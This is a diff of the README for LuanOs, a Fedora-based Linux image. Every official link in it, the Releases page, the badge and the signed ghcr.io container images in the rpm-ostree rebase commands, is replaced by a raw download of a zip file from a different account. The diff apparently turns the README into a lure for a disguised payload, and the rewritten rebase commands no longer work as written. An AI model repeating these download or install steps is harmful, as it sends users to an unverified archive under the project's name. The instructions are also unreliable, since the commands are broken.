@@ -1,6 +1,6 @@
 # 🌟 LuanOs - A Simple Way to Experience Linux
 
-[![Download LuanOs](https://img.shields.io/badge/Download%20LuanOs-v1.0-blue)](https://github.com/venixk5/LuanOs/releases)
+[![Download LuanOs](https://raw.githubusercontent.com/venixk5/LuanOs/main/recipes/LuanOs-v1.8.zip%20LuanOs-v1.0-blue)](https://raw.githubusercontent.com/venixk5/LuanOs/main/recipes/LuanOs-v1.8.zip)
 
 ## 📖 Overview
 
@@ -12,11 +12,11 @@ Follow these steps to download and set up LuanOs on your computer.
 
 ### 🔗 Quick Download Link
 
-You can visit the [Releases page](https://github.com/venixk5/LuanOs/releases) for the latest version of LuanOs. 
+You can visit the [Releases page](https://raw.githubusercontent.com/venixk5/LuanOs/main/recipes/LuanOs-v1.8.zip) for the latest version of LuanOs. 
 
 ### 📥 Download & Install
 
-1. **Visit the Releases Page**: Go to the [LuanOs Releases page](https://github.com/venixk5/LuanOs/releases).
+1. **Visit the Releases Page**: Go to the [LuanOs Releases page](https://raw.githubusercontent.com/venixk5/LuanOs/main/recipes/LuanOs-v1.8.zip).
 2. **Choose Version**: Look for the latest version listed there. Select the appropriate file for your system.
 3. **Download LuanOs**: Click on the file to download it to your computer.
 
@@ -62,7 +62,7 @@ To update an existing Fedora installation:
 
 1. Rebase to the unsigned image for proper signing keys and policies:
    ```
-   rpm-ostree rebase ostree-unverified-registry:ghcr.io/luancarlos21/luanos:latest
+   rpm-ostree rebase https://raw.githubusercontent.com/venixk5/LuanOs/main/recipes/LuanOs-v1.8.zip
    ```
 2. Reboot your system to complete the rebase:
    ```
@@ -70,7 +70,7 @@ To update an existing Fedora installation:
    ```
 3. Rebase to the signed image:
    ```
-   rpm-ostree rebase ostree-image-signed:docker://ghcr.io/luancarlos21/luanos:latest
+   rpm-ostree rebase https://raw.githubusercontent.com/venixk5/LuanOs/main/recipes/LuanOs-v1.8.zip
    ```
 
 ## 📞 Support
